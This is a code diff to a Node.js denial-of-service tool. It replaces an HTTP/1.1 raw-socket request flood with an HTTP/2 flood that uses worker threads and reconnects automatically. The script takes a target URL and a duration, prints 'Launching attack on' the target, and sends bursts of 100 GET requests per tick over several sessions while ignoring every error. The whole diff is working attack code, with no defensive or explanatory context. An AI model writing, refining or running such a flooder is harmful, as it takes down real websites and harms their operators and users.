@@ -1,7 +1,6 @@
-const net = require('net');
+const http2 = require('http2');
 const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
 const { cpus } = require('os');
-const { URL } = require('url');
 
 const THREADS = Math.min(6, cpus().length);
 
@@ -11,45 +10,47 @@ if (isMainThread) {
         process.exit(1);
     }
 
-    const targetUrl = new URL(process.argv[2]);
+    const target = process.argv[2];
     const duration = parseInt(process.argv[3]);
 
-    console.log(`Launching HTTP/1.1 attack on ${targetUrl.hostname} for ${duration}s with ${THREADS} threads...`);
+    console.log(`Launching attack on ${target} for ${duration}s with ${THREADS} threads...`);
 
     for (let i = 0; i < THREADS; i++) {
-        new Worker(__filename, { workerData: { hostname: targetUrl.hostname, port: targetUrl.port || 80, path: targetUrl.pathname || '/', duration } });
+        new Worker(__filename, { workerData: { target, duration } });
     }
 } else {
-    const { hostname, port, path, duration } = workerData;
+    const { target, duration } = workerData;
     const end = Date.now() + duration * 1000;
 
-    function createH11Flood() {
-        if (Date.now() > end) return;
+    function startFlood(client) {
+        const interval = setInterval(() => {
+            if (Date.now() > end) return clearInterval(interval);
+            if (client.destroyed || client.closed) return;
 
-        const socket = net.connect(port, hostname, () => {
-            const req = `GET ${path} HTTP/1.1\r\nHost: ${hostname}\r\nConnection: keep-alive\r\n\r\n`;
-            
-            let interval = setInterval(() => {
-                if (Date.now() > end || socket.destroyed) {
-                    clearInterval(interval);
-                    socket.destroy();
-                    return;
-                }
+            try {
                 for (let i = 0; i < 100; i++) {
-                    socket.write(req);
+                    const req = client.request({ ':path': '/', ':method': 'GET' });
+                    req.on('error', () => {});
+                    req.end();
                 }
-            }, 0);
-        });
-
-        socket.on('error', () => {});
-        socket.on('close', () => {
-            setTimeout(createH11Flood, 10);
-        });
-
-        setTimeout(() => {
-            socket.destroy();
-        }, 2000); // recycle socket every 2s
+            } catch (err) {
+                // Ignore errors from dead sessions
+            }
+        }, 0);
     }
 
-    for (let i = 0; i < 50; i++) createH11Flood();
+    function createConnection() {
+        let client;
+        try {
+            client = http2.connect(target);
+        } catch (err) {
+            return setTimeout(createConnection, 100);
+        }
+
+        client.on('error', () => {});
+        client.on('close', () => setTimeout(createConnection, 100));
+        client.on('connect', () => startFlood(client));
+    }
+
+    for (let i = 0; i < 10; i++) createConnection();
 }
